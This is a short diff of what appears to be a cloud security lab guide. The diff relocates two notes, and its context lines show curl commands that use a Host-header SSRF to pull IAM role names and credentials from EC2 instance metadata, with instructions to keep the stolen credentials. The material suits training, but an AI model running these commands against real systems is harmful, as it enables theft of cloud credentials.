@@ -215,12 +215,11 @@ Steal Role
 .. code:: bash
 
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
-   
-.. note:: **Copy the response to a text file**.  You will need the role
 
 .. figure:: ./images/role.png
    :alt: role
 |
+.. note:: **Copy the response to a text file**.  You will need the role
 Steal Crendentials
 ++++++++++++++++++
 
@@ -231,11 +230,10 @@ Steal Crendentials
 
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'
 
-.. note::  **Copy response to text file**.  You will use the stolen credentials
-
 .. figure:: ./images/ssrf2.png
    :alt: creds
 |
+.. note::  **Copy response to text file**.  You will use the stolen credentials
 Pacu Discovery 
 ++++++++++++++
 
